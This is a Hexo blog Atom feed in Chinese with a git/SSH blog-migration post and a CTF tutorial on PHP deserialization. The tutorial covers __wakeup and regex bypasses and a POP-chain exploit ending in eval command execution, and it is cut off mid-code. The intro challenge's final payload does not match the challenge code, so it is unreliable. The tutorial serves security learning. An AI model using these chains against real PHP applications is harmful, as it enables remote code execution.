<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shmily-ing</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-06-13T17:10:12.971Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Shmily-ing</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>blog迁移</title>
    <link href="http://example.com/2022/06/13/blog%E8%BF%81%E7%A7%BB/"/>
    <id>http://example.com/2022/06/13/blog%E8%BF%81%E7%A7%BB/</id>
    <published>2022-06-13T13:44:01.000Z</published>
    <updated>2022-06-13T17:10:12.971Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>要换电脑，迁移下blog，感觉有些东西还是要写出来才有点感觉</li></ul><hr><h1 id="git配置"><a href="#git配置" class="headerlink" title="git配置"></a>git配置</h1><ul><li>环境该下的下载好，blog文件可以直接拖拽到另一台电脑上就行</li></ul><ul><li>下面就是配置git 的ssh key，连接github blog仓库</li></ul><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;Shmily-ing&quot;    #仓库名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git config --global user.email &quot;xxxxxx@qq.com&quot;</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -C xxxxxx@qq.com”   #默认位置就行 ，会生成公私钥</span><br></pre></td></tr></table></figure><ul><li>id_rsa.pub  添加到github</li></ul><p><img src="/2022/06/13/blog%E8%BF%81%E7%A7%BB/image-20220614005502831.png" alt="image-20220614005502831"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\shmilying&gt;git init</span><br><span class="line">Initialized empty Git repository in C:&#x2F;Users&#x2F;shmilying&#x2F;.git&#x2F;</span><br><span class="line"></span><br><span class="line">C:\Users\shmilying&gt;ssh -T git@github.com</span><br><span class="line">ssh: connect to host github.com port 22: Connection refused</span><br><span class="line"></span><br><span class="line">C:\Users\shmilying&gt;git remote add origin git@github.com:Shmily-ing&#x2F;Shmily-ing.github.io.git</span><br><span class="line"></span><br><span class="line">C:\Users\shmilying&gt;git remote -v</span><br><span class="line">origin  git@github.com:Shmily-ing&#x2F;Shmily-ing.github.io.git (fetch)</span><br><span class="line">origin  git@github.com:Shmily-ing&#x2F;Shmily-ing.github.io.git (push)</span><br></pre></td></tr></table></figure><p>然后在git bash里面输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><h1 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h1><p><a href="https://blog.csdn.net/qq_52293358/article/details/124535927">(28条消息) Windows下解决ssh: connect to host github.com port 22: Connection refused_Sososoby的博客-CSDN博客</a></p><p>我用的方法三，完美解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User xxxxxx9@qq.com</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile C:&#x2F;Users&#x2F;shmilying&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi Shmily-ing! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure><p>然后就hexo命令和之前一样。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;要换电脑，迁移下blog，感觉有些东西还是要写出来才有点感觉&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&quot;git配置&quot;&gt;&lt;a href=&quot;#git配置&quot; class=&quot;headerlink&quot; title=&quot;git配置&quot;&gt;&lt;/a&gt;git配置&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;环境该下的下载好，blog文件可以直接拖拽到另一台电脑上就行&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;下面就是配置git 的ssh key，连接github blog仓库&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>php反序列化</title>
    <link href="http://example.com/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-04-29T07:25:30.000Z</published>
    <updated>2022-05-15T17:44:52.120Z</updated>
    
    <content type="html"><![CDATA[<ul><li>ctf中的php反序列化</li></ul><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li><p>序列化 即使用<code>serialize();</code>将类的对象的数据用字符串方式进行表示</p></li><li><p>反序列化 即使用<code>unserialize();</code>来读取 序列化格式的数据</p></li></ul><p>使用序列化和反序列化 主要是方便数据的存储和数据的转换读取。</p><a id="more"></a><h3 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/4/29 16:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $height;</span><br><span class="line">    <span class="keyword">public</span> $weight;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$height,$weight</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;height = $height;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;weight = $weight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$jyf = <span class="keyword">new</span> body(<span class="string">&#x27;180&#x27;</span>,<span class="number">130</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($jyf).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(<span class="string">&quot;O:4:\&quot;body\&quot;:2:&#123;s:6:\&quot;height\&quot;;s:3:\&quot;180\&quot;;s:6:\&quot;weight\&quot;;i:130;&#125;&quot;</span>));</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;body&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;height&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;180&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;weight&quot;</span>;i:<span class="number">130</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">object</span>(body)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;height&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;180&quot;</span></span><br><span class="line">  [<span class="string">&quot;weight&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">130</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br></pre></td></tr></table></figure><p>序列化结构：</p><p>类型:类长度:”类名”:类的属性数量:{变量1类型:变量名1长度:变量名1; 参数1类型:参数1长度:参数1; 变量2类型:变量名2长度:”变量名2”; 参数2类型:参数2长度:参数2;… …}</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>unserialize()的参数可控，通过利用一些魔术方法，构造反序列化字符，进行文件写入，命令执行等操作。</p><h3 id="变量三种修饰"><a href="#变量三种修饰" class="headerlink" title="变量三种修饰"></a>变量三种修饰</h3><p><strong>public修饰变量</strong></p><p>反序列化内容不需要修改</p><p><strong>protected修饰变量</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">protected $height;</span><br><span class="line">protected $weight;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;body&quot;:2:&#123;s:9:&quot; * height&quot;;s:3:&quot;180&quot;;s:9:&quot; * weight&quot;;i:130;&#125;</span><br></pre></td></tr></table></figure><p>%00代替空格，占一个字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;body&quot;:2:&#123;s:9:&quot;%00*%00height&quot;;s:3:&quot;180&quot;;s:9:&quot;%00*%00weight&quot;;i:130;&#125;</span><br></pre></td></tr></table></figure><p><strong>private修饰变量</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">private $height;</span><br><span class="line">private $weight;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;body&quot;:2:&#123;s:12:&quot; body height&quot;;s:3:&quot;180&quot;;s:12:&quot; body weight&quot;;i:130;&#125;</span><br></pre></td></tr></table></figure><p>同理%00代替空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;body&quot;:2:&#123;s:12:&quot;%00body%00height&quot;;s:3:&quot;180&quot;;s:12:&quot;%00body%00weight&quot;;i:130;&#125;</span><br></pre></td></tr></table></figure><h3 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h3><ul><li>绕过<strong>__wakeup()</strong></li></ul><p>对象属性个数的值大于真实的属性 (PHP5&lt;5.6.25 或 PHP7&lt;7.0.10)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;body&quot;:2:&#123;s:6      -&gt;     O:4:&quot;body&quot;:3:&#123;s:6 </span><br></pre></td></tr></table></figure><ul><li><strong>绕过preg_match()</strong></li></ul><p>使用+绕过正则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+4:&quot;body&quot;:2:&#123;s:6:&quot;height&quot;;s:3:&quot;180&quot;;s:6:&quot;weight&quot;;i:130;&#125;</span><br></pre></td></tr></table></figure><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p><code>__construct()</code> #当对象创建时自动被调用</p><p><code>__destruct()</code> #当脚本运行结束时自动被调用</p><p><code>__sleep()</code> #当对象序列化的时候自动被调用</p><p><code>__wakeup() </code>#当反序列化为对象时自动被调用</p><p><code>__toString() </code>#当直接输出对象引用时自动被调用  （echo 等输出）</p><p><code>__call() </code>#当要调用的方法不存在或权限不足时自动被调用</p><p><code>__invoke() </code>#当把一个类当作函数使用时自动被调用</p><h3 id="入门题目"><a href="#入门题目" class="headerlink" title="入门题目"></a>入门题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>( <span class="string">&#x27;flag.php&#x27;</span> );</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/4/29 16:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $fla=<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($code)) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ($fla =<span class="string">&#x27;hahaha&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造$fla =’hahaha’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/5/8 2:39</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $fla=<span class="string">&#x27;hahaha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line"></span><br><span class="line"><span class="comment">#O:1:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>绕过<code>__wakeup()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>最终</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:20001&#x2F;unserialize1.php&#x2F;?code&#x3D;O:1:%22A%22:2:&#123;s:6:%22target%22;O:1:%22B%22:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220516011212369.png" alt="image-20220516011212369"></p><h1 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h1><h3 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h3><p><code>__destruct()</code> /<code>__wakeup()</code>是起点 （自动调用的方法）</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>通过起点分析，例如该起点<code>__destruct()</code>方法里面的操作会触发哪些魔术方法，</p><p>如果有，则进入下一个类继续那样分析，</p><p>如果没有就可以看<code>__destruct()</code>调用哪些其他类的方法，继续到下个类的方法进行分析，</p><p>如果<code>__destruct()</code>调用没有哪些其他类的方法，一般不会，因为起点将毫无意义啊，那就只能指向其他类去调有用的方法了吧</p><p>分析时候可以<code>正推利用链</code>或者<code>倒推利用链</code></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><ul><li>das三月su例题ezpop[atao]</li></ul><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $v1;</span><br><span class="line">    <span class="keyword">public</span> $v2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$a, $b</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $m1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从起点<code>__destruct()</code>开始分析 ：</p><ol><li><p>先new fin()，fin()里面有 echo输出，会调用__toString()，看到what里面有这个方法，直接this-&gt;f1= new what()</p></li><li><p>what()里面调了个run方法，fin和mix都有这个方法，这里用mix类方法，$this-&gt;a =new mix()</p></li><li><p>下面就要用到__invoke这个魔术方法将类当做函数使用 ,$this-&gt;m1=new crow()</p></li><li><p>进入crow类中的__invoke方法，这个方法里最后会去指向一个world函数，但是搜遍全文未发现该函数。默认会调用<code>__call</code>这个魔术方法，$this-&gt;v1=new fin()。</p></li><li><p>然后在<code>__call</code>方法中发现$this-&gt;f1-&gt;get_flag()，$this-&gt;f1去调用get_flag()这个方法，所以$this-&gt;f1=new mix()。</p></li><li><p>mix()中通过对m1赋值即可命令执行，前面的注释符使用<code>\n</code>绕过。</p></li></ol><p>利用链过程如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/5/15 21:11</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $m1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $v1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$a, $b</span>)</span></span><br><span class="line"><span class="function">    